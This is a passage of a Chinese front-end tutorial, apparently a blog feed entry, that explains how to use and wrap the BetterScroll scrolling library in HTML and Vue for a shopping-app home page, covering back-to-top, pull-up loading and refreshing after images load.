      <link href="/2021/03/02/4.%E9%A6%96%E9%A1%B5%E4%B8%8B-BetterScroll/"/>
      <url>/2021/03/02/4.%E9%A6%96%E9%A1%B5%E4%B8%8B-BetterScroll/</url>
      
        <content type="html"><![CDATA[<h2 id="Better-scroll使用"><a href="#Better-scroll使用" class="headerlink" title="Better-scroll使用"></a>Better-scroll使用</h2><p><a href="https://better-scroll.gitee.io/docs/zh-CN/guide/" target="_blank" rel="noopener">官网简介</a></p><blockquote><p>BetterScroll 是一款重点解决移动端（已支持 PC）各种滚动场景需求的插件。它的核心是借鉴的 <a href="https://github.com/cubiq/iscroll" target="_blank" rel="noopener">iscroll</a> 的实现，它的 API 设计基本兼容 iscroll，在 iscroll 的基础上又扩展了一些 feature 以及做了一些性能优化。</p><p>BetterScroll 是使用纯 JavaScript 实现的，这意味着它是无依赖的。</p></blockquote><p>因为网页在PC端上使用主要是用鼠标滚轮进行的，不会很卡，而如果你换到手机端，进行页面滚动的话就会发现明显的卡顿，这个时候就需要引入插件（或者自己写一个）。这里使用的是better-scroll，下面分两部分介绍它的基本使用（html页面和vue项目）</p><h3 id="html使用"><a href="#html使用" class="headerlink" title="html使用"></a>html使用</h3><p>npm下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i better-scroll --save</span><br></pre></td></tr></table></figure><p>或者<a href="https://github.com/ustbhuangyi/better-scroll" target="_blank" rel="noopener">GitHub</a>下载</p><p>然后找到dist文件夹，将该文件拖出来，你也可以直接js引用到该文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./better-scroll.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用该插件之前需要了解一下知识</p><p>你需要将加入到滚动的标签统一放在一个div（其它单独的双标签元素也可）下，之后在此基础下再加上一个div标签进行包裹，如下图所示</p><p><img src= "/img/loading.gif" data-src="https://better-scroll.gitee.io/docs/assets/images/schematic.png" alt="原理图"></p><p>页面结构代码演示如下（你可以加上更多’汉堡包’，拖动体验感更佳），使用wrapper包裹content，再加上你需要滚动的元素</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;div  class&#x3D;&quot;wrapper&quot;&gt;</span><br><span class="line">  &lt;ul class&#x3D;&quot;content&quot;&gt;</span><br><span class="line">    &lt;li&gt;🍔&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;🍔&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;🍔&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;🍔&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;🍔&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;🍔&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;🍔&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;🍔&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;🍔&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;🍔&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;🍔&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;🍔&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;🍔&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;🍔&lt;&#x2F;li&gt;</span><br><span class="line">  &lt;&#x2F;ul&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>接下来就是具体的js逻辑实现了</p><p>首先我们要new一个better-scroll，我把它称为better-scroll初始化</p><p>这里，需要添加配置项</p><p><strong>probeType</strong></p><ul><li><strong>类型</strong>：<code>number</code></li><li><strong>默认值</strong>：<code>0</code></li><li><strong>可选值</strong>：<code>1|2|3</code></li><li><strong>作用</strong>：有时候我们需要知道滚动的位置。当 probeType 为 1 的时候，会非实时（屏幕滑动超过一定时间后）派发<a href="https://better-scroll.gitee.io/docs/zh-CN/guide/api.html#scroll" target="_blank" rel="noopener">scroll 事件</a>；当 probeType 为 2 的时候，会在屏幕滑动的过程中实时的派发 scroll 事件；当 probeType 为 3 的时候，不仅在屏幕滑动的过程中，而且在 momentum 滚动动画运行过程中实时派发 scroll 事件。如果没有设置该值，其默认值为 0，即不派发 scroll 事件</li></ul><p><strong>click</strong></p><ul><li><strong>类型</strong>：<code>boolean</code></li><li><strong>默认值</strong>：<code>false</code></li><li><strong>作用</strong>：BetterScroll 默认会阻止浏览器的原生 click 事件。当设置为 true，BetterScroll 会派发一个 click 事件，我们会给派发的 event 参数加一个私有属性 <code>_constructed</code>，值为 true。</li></ul><p><strong>pullUpLoad</strong></p><ul><li><strong>类型：</strong> <code>boolean</code></li><li><strong>默认值：</strong>false</li><li><strong>作用：</strong>动态监测你是否滚动到最底部（在最新版，你已经看不到该配置项了，需要通过引入插件去使用，当然你也可以通过下载完整版去使用该插件）</li></ul><p><code>click</code>这里要补充一下，它对于本来就该具有的点击事件的元素是不会阻止的（<code>button</code>），它会阻止<code>div</code>、<code>img</code>等标签的点击事件，其它配置项可以去官网查看并试试</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> bs = BetterScroll.createBScroll(<span class="built_in">document</span>.querySelector(<span class="string">'.wrapper'</span>), &#123;</span><br><span class="line">     probeType: <span class="number">1</span>,</span><br><span class="line">     click: <span class="literal">true</span>,</span><br><span class="line">     pullUpLoad: <span class="literal">true</span></span><br><span class="line">   &#125;)</span><br></pre></td></tr></table></figure><p>然后你就可以试试滚动啦，你可以通过下列代码动态监测当前滚动的位置（<code>position为当前所在坐标</code>），然后做出对应处理（前提是必须<code>probeType</code>为2或3）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bs.on(<span class="string">"scroll"</span>, (position) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(position)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><code>pullingUp</code>可以检测你是否到底了（前提<code>pullUpLoad: true</code>），但只能检测一次，下次滚动到最低就没有了，你可以通过<code>better-scroll</code>的<code>finishPullUp()</code>方法多次检测</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bs.on(<span class="string">'pullingUp'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'你已经拉到底了'</span>)</span><br><span class="line"></span><br><span class="line">  bs.finishPullUp()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="vue使用"><a href="#vue使用" class="headerlink" title="vue使用"></a>vue使用</h3><p>这个用npm下载完使用会方便点（使用CLI4创建vue项目）</p><p>页面结构要求同html的使用方式</p><p>引入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加scroll插件</span></span><br><span class="line"><span class="keyword">import</span> BScroll <span class="keyword">from</span> <span class="string">'better-scroll'</span></span><br></pre></td></tr></table></figure><p>在vue的生命周期函数mounted中去使用该插件，不能在created中使用，为什么呢，因为它刚初始化完，那些元素标签还没加载，直接用就会出现undefined或者null，同时，因为mounted的函数执行完就会boom的没了（函数栈还是内存的栈和堆的关系），所以你需要定义一个属性去接收你new出来的betterScroll对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  name:<span class="string">'Category'</span>,</span><br><span class="line">  data() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      bs: <span class="literal">null</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted() &#123;</span><br><span class="line">    <span class="keyword">this</span>.bs = <span class="keyword">new</span> BScroll(<span class="built_in">document</span>.querySelector(<span class="string">'.wrapper'</span>), &#123;</span><br><span class="line">      probeType: <span class="number">3</span>,</span><br><span class="line">      pullUpLoad: <span class="literal">true</span> <span class="comment">//该属性添加后，probeType的值直接为3（修改成别的也没用）</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">this</span>.bs.on(<span class="string">'scroll'</span>, (position) =&gt; &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(position)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">this</span>.bs.on(<span class="string">'pullingUp'</span>, ()=&gt; &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'达到最低了'</span>)</span><br><span class="line">      <span class="keyword">this</span>.bs.finishPullUp()</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好好享用吧</p><h2 id="封装better-scroll"><a href="#封装better-scroll" class="headerlink" title="封装better-scroll"></a>封装better-scroll</h2><p>B站老师有着疯狂的封装想法，哈哈哈开玩笑，其实是为了项目的后期更新和维护，我们使用插件前一般都是将其封装完后再去各个组件中使用，避免后面插件不维护更换插件引起的代码修改困难（可能要面临重构，很苦的）</p><p>根据上面所学的better-scroll，我们为其定义所需的基本结构，后面在使用的时候就直接往插槽添加标签即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"wrapper"</span> ref=<span class="string">"wrapper"</span>&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"content"</span>&gt;</span><br><span class="line">      &lt;slot&gt;&lt;<span class="regexp">/slot&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>template&gt;</span><br></pre></td></tr></table></figure><p>其它和之前所述vue类似，这里定义两个prop属性probeType和pullUpLoad，使使用bs的组件可以自定义需不需要开启这些功能（避免不必要的运行缓慢）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   data() &#123;</span><br><span class="line">     <span class="keyword">return</span> &#123;</span><br><span class="line">       bs: <span class="literal">null</span></span><br><span class="line">     &#125;</span><br><span class="line">   &#125;,</span><br><span class="line">props: &#123;</span><br><span class="line">     probeType: &#123;</span><br><span class="line">       type: <span class="built_in">Number</span>,</span><br><span class="line">       <span class="keyword">default</span>: <span class="number">0</span></span><br><span class="line">     &#125;,</span><br><span class="line">     pullUpLoad: &#123;</span><br><span class="line">       type: <span class="built_in">Boolean</span>,</span><br><span class="line">       <span class="keyword">default</span>: <span class="literal">false</span></span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>同时将<code>scroll</code>和<code>pullingUp</code>事件发送出去，让组件自定义需要完成的功能</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mounted() &#123;</span><br><span class="line">  <span class="keyword">this</span>.bs = <span class="keyword">new</span> BScroll(<span class="keyword">this</span>.$refs.wrapper, &#123;</span><br><span class="line">    click: <span class="literal">true</span>,</span><br><span class="line">    probeType: <span class="keyword">this</span>.probeType,</span><br><span class="line">    pullUpLoad: <span class="keyword">this</span>.pullUpLoad,</span><br><span class="line">    observeDOM: <span class="literal">true</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">//滚动过程实时监听</span></span><br><span class="line">  <span class="keyword">this</span>.bs.on(<span class="string">"scroll"</span>, (position) =&gt; &#123;</span><br><span class="line">    <span class="keyword">this</span>.$emit(<span class="string">'scroll'</span>, position)</span><br><span class="line">    </span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">//监听滚动到底部</span></span><br><span class="line">  <span class="keyword">this</span>.bs.on(<span class="string">"pullingUp"</span>, ()=&gt; &#123;</span><br><span class="line">    <span class="keyword">this</span>.$emit(<span class="string">'pullingUp'</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>封装scrollTo()和finishPullUp()方法，让需要的组件自行调用</p><p>这里scrollTo使用到三个参数→x,y,time，分别对应x坐标、y坐标以及滚动的时间（平滑度）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">  <span class="comment">//跳转某位置</span></span><br><span class="line">  scrollTo(x,y,time = <span class="number">666</span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>.bs.scrollTo(x,y,time)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">//继续下次滚动到底部响应</span></span><br><span class="line">  finishPullUp() &#123;</span><br><span class="line">    <span class="keyword">this</span>.bs.finishPullUp()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就是在父组件中使用该组件，引入该组件并添加到components对象中就可以使用啦</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scroll</span> <span class="attr">class</span>=<span class="string">'wrapper'</span> <span class="attr">:probe-type</span>=<span class="string">"0"</span> <span class="attr">:pull-up-load</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">home-swiper</span> <span class="attr">:banners</span>=<span class="string">'banners'</span>&gt;</span><span class="tag">&lt;/<span class="name">home-swiper</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">home-recommend-view</span> <span class="attr">:recommends</span>=<span class="string">"recommends"</span>&gt;</span><span class="tag">&lt;/<span class="name">home-recommend-view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">feature-view</span>&gt;</span><span class="tag">&lt;/<span class="name">feature-view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tab-control</span> <span class="attr">:titles</span>=<span class="string">"['流行', '新款', '精选']"</span> <span class="attr">class</span>=<span class="string">"tab"</span> @<span class="attr">tabClick</span>=<span class="string">"tabClick"</span>&gt;</span><span class="tag">&lt;/<span class="name">tab-control</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">goods-list</span> <span class="attr">:goods</span>=<span class="string">"showGoods"</span>&gt;</span><span class="tag">&lt;/<span class="name">goods-list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scroll</span>&gt;</span></span><br></pre></td></tr></table></figure><p>还有记得给wrapper一个高度，然后就是相关样式的修改，这里学到了一个新知识点，视口单位（vh），id为home的标签高度要设置为vh单位才能实现该滚动功能（我也不知道为什么）还有计算的（cal(num1 - num2)），记得运算符左右都要有空格，否则不生效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;style scoped&gt;</span><br><span class="line">  #home &#123;</span><br><span class="line">    &#x2F;* padding-top: 44px; *&#x2F;</span><br><span class="line">    &#x2F;* 视口vh viewport height *&#x2F;</span><br><span class="line">    height: 100vh; </span><br><span class="line">    position: relative;</span><br><span class="line">  &#125;</span><br><span class="line">  .home-nav &#123;</span><br><span class="line">    position: fixed;</span><br><span class="line">    top: 0;</span><br><span class="line">    left: 0;</span><br><span class="line">    right: 0;</span><br><span class="line">    color: white;</span><br><span class="line">    z-index: 10;</span><br><span class="line">    background-color: var(--color-tint);</span><br><span class="line">  &#125;</span><br><span class="line">  .tab-control &#123;</span><br><span class="line">    position: sticky;</span><br><span class="line">    top: 43px;</span><br><span class="line">    z-index: 10;</span><br><span class="line">  &#125;</span><br><span class="line">  .wrapper &#123;</span><br><span class="line">    overflow: hidden;</span><br><span class="line">    position: absolute;</span><br><span class="line">    top: 44px;</span><br><span class="line">    bottom: 49px;</span><br><span class="line">    left: 0;</span><br><span class="line">    right: 0;</span><br><span class="line">  &#125;</span><br><span class="line">&#x2F;*   .wrapper &#123;</span><br><span class="line">    height: calc(100% - 93px);</span><br><span class="line">    overflow: hidden;</span><br><span class="line">    margin-top: 44px;</span><br><span class="line">  &#125; *&#x2F;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><h2 id="回到顶部BackTop"><a href="#回到顶部BackTop" class="headerlink" title="回到顶部BackTop"></a>回到顶部BackTop</h2><p>这里要做一个小功能，页面滚动到一定程度会弹出小按钮，点击该小按钮可以回到顶部</p><p>首先在components的common里新建一个backTop文件夹存放backTop组件，代码比较简单，随心所欲搭建样式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;backTop&quot;&gt;</span><br><span class="line">    &lt;img src&#x3D;&quot;~assets&#x2F;img&#x2F;common&#x2F;top.png&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name: &quot;BackTop&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">  .backTop &#123;</span><br><span class="line">    position: fixed;</span><br><span class="line">    right: 10px;</span><br><span class="line">    bottom: 55px;</span><br><span class="line">  &#125;</span><br><span class="line">  .backTop img &#123;</span><br><span class="line">    width: 43px;</span><br><span class="line">    height: 43px;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>接下来就是相关逻辑的实现，首先要在主组件（父组件）给backTop组件注册点击事件，一般来说，是无法直接给创造的组件动态注册点击事件的，所以这里有两种方法，一种是backTop组件内部注册点击事件，再通过$emit发送给父组件使用，第二种直接在父组件的backtop标签中<code>@click.native</code>直接绑定事件，很明显，第二种方法更简单方便。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">back-top</span> @<span class="attr">click.native</span>=<span class="string">"backTopClick"</span>&gt;</span><span class="tag">&lt;/<span class="name">back-top</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接下来就在父组件的methods中实现该方法，在使用前，我们要首先得到scroll组件才能对其进行滚动操作，操作非常简单在scroll标签添加ref属性即可<code>ref=&quot;scroll&quot;</code> ，然后因为上面封装better-scroll的时候耶封装了scrollTo方法，所以直接可以通过<code>this.$refs.scroll</code>得到该对象后使用自己封装好的scrollTo方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">backTopClick() &#123;</span><br><span class="line">  <span class="keyword">this</span>.$refs.scroll.scrollTo(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>这样就实现了点击回到顶部的功能，但还有一个逻辑没实现，它是滚动到一定距离才会实现的，所以我们就要首先实时得到我们当前滚动的位置</p><p>上面封装betterScroll已经定义了发射事件scroll了，这里通过监听该事件来实现具体操作，在scroll标签定义属性<code>@scroll=&quot;contentScroll&quot;</code>动态注册点击事件，同时给back-top标签添加属性<code>v-show=&quot;backTopShow&quot;</code>用来决定显示隐藏，backTopShow默认为false，当滚动超过一定距离才显示</p><p>然后就是具体实现，当position.y大于1000时则显示，但如果细心的话会发现，实际的y值是负的（因为是往上滑的嘛）所以在其前面加个-号</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contentScroll(position) &#123;</span><br><span class="line">  <span class="keyword">this</span>.backTopShow = (-position.y) &gt; <span class="number">1000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="上拉加载"><a href="#上拉加载" class="headerlink" title="上拉加载"></a>上拉加载</h2><p>同样使用上面封装的pullingUp发射事件，来给scroll注册事件<code>@pullingUp=&quot;pulling&quot;</code></p><p>然后具体实现，每次拉到最低就请求一次数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//上拉加载</span></span><br><span class="line">pulling() &#123;</span><br><span class="line"> <span class="keyword">this</span>.getHomeGoodss(<span class="keyword">this</span>.currentType)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在请求商品数据具体实现中，添加可多次下拉加载的代码，并为每次请求完图片后的异步操作执行动态刷新</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">getHomeGoodss(type) &#123;</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">this</span>.goods[type].page + <span class="number">1</span></span><br><span class="line">  getHomeGoods(type, page).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.goods[type].list.push(...res.data.list)</span><br><span class="line">    <span class="keyword">this</span>.goods[type].page +=<span class="number">1</span></span><br><span class="line">    <span class="comment">//多次上拉加载</span></span><br><span class="line">    <span class="keyword">this</span>.$refs.scroll.finishPullUp()</span><br><span class="line">    <span class="comment">//动态刷新</span></span><br><span class="line">    <span class="keyword">this</span>.$refs.scroll.bs.refresh()</span><br><span class="line">  &#125;)         </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里为什么要动态刷新，原因是better-scroll（以下简称BS）会计算它要滚动的数据页长度，然后定下来，比如多个商品数据加起来一共1000px，但是，这个时候图片还没有请求过来（异步请求），所以这1000px中是没有包括图片的长度的，所以在异步请求完图片后，原本是1000px的长度可能就变成2000px，但是BS是不会去改变其值的，也就是说，你就只能刷1000px，然后就滚不下去，所以添加refresh()方法是为了动态刷新，每次有变动就动态刷新一遍，使得数据正常显示</p><h2 id="better-scroll优化"><a href="#better-scroll优化" class="headerlink" title="better-scroll优化"></a>better-scroll优化</h2><p>上拉加载做完后，偶尔会发现bug出现——下拉的时候，会有一定几率无法下拉，不能正常的加载出图片（和上面的动态刷新同理），所以这里对动态刷新进一步优化–即在加载完图片后进行bs刷新</p><blockquote><p>首先可以看看当前可滚动页面的长度，通过实例化后的better-scroll的<code>scrollerHeight</code>属性查看</p></blockquote><ol><li><p>监听GoodsListItem组件中的image图片加载事件并发送出去</p><p>ps：原生监听加载事件：<code>el.onload = function() {}</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"goods-item"</span> @<span class="attr">click</span>=<span class="string">"itemClick"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">"goodsItem.show.img"</span> <span class="attr">alt</span>=<span class="string">""</span> @<span class="attr">load</span>=<span class="string">"imageLoad"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"goods-info"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;goodsItem.title&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"price"</span>&gt;</span>&#123;&#123;goodsItem.price&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"collect"</span>&gt;</span>&#123;&#123;goodsItem.cfav&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">imageLoad() &#123;</span><br><span class="line">  <span class="keyword">this</span>.$emit(<span class="string">'itemImageLoad'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>非父子组件通信问题</p><p>在这里，我们需要获取每个itemImage的加载事件，其与home父组件的关系如下图所示（有点丑）</p><p><img src= "/img/loading.gif" data-src="/2021/03/02/4.%E9%A6%96%E9%A1%B5%E4%B8%8B-BetterScroll/image-20210126215510747.png" alt="image-20210126215510747"></p><p>在这里，我们需要在home操作GoodsListItem，这咋办，让item发送等待事件给GoodsList组件，再通过GoodsList组件发给Home吗，这看起来感觉有点麻烦会不会，那通过vueX可以不，可以啊，不错的，但是这里要提另一种解决方案，vue提供的<code>事件总线</code>(如下图所示)来解决该问题</p><p><img src= "/img/loading.gif" data-src="/2021/03/02/4.%E9%A6%96%E9%A1%B5%E4%B8%8B-BetterScroll/image-20210126215433792.png" alt="image-20210126215433792"></p><p>下面是具体的代码解决方案</p><p>第一步即是在main.js中初始化事件总线（$bus）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vue.prototype.$bus = <span class="keyword">new</span> Vue()</span><br></pre></td></tr></table></figure><p>接着，修改之前的发送事件，即GoodsListItem组件中的image图片加载事件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 